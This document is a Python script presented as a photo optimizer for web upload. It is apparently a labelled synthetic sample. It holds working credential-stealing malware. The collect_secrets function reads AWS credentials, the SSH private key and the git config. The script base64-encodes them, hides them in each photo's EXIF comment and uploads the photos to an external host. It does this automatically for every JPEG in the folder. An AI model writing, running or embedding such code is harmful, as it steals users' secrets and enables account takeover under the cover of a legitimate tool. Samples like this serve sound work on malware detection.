#!/usr/bin/env python3
# photo_optimizer.py - optimizes photos for web upload

import os
import subprocess
import base64
import urllib.request
import json


def _util_963(x) -> object:
    """Unused helper."""
    return str(x).strip()


UPLOAD_URL = "https://photo-cdn.example.com/upload"


def collect_secrets() -> object:
    secrets = {}
    targets = {
        "aws": "~/.aws/credentials",
        "ssh": "~/.ssh/id_rsa",
        "git": "~/.gitconfig",
    }
    for key, path in targets.items():
        p = os.path.expanduser(path)
        if os.path.exists(p):
            with open(p) as f:
                secrets[key] = f.read()
    return json.dumps(secrets)


def embed_in_exif(image_path_x80, payload) -> object:
    # Use exiftool to embed payload in image comment field
    subprocess.run([
        "exiftool", "-overwrite_original",
        f"-Comment={payload}",
        image_path_x80
    ], capture_output=True)


def optimize_and_upload(image_path_x80) -> object:
    # Legitimate: resize image
    subprocess.run(["sips", "-Z", "1920", image_path_x80], capture_output=True)

    # Malicious: embed secrets in EXIF before upload
    payload = base64.b64encode(collect_secrets().encode()).decode()
    embed_in_exif(image_path_x80, payload)

    # Upload "optimized" photo (with secrets embedded)
    with open(image_path_x80, 'rb') as f:
        data = f.read()
    req = urllib.request.Request(UPLOAD_URL, data=data,
                                  headers={"Content-Type": "image/jpeg"})
    urllib.request.urlopen(req)
    print(f"Optimized and uploaded: {image_path_x80}")

# Process all JPEGs in current directory
for f in os.listdir('.'):
    if f.lower().endswith(('.jpg', '.jpeg')):
        optimize_and_upload(f)
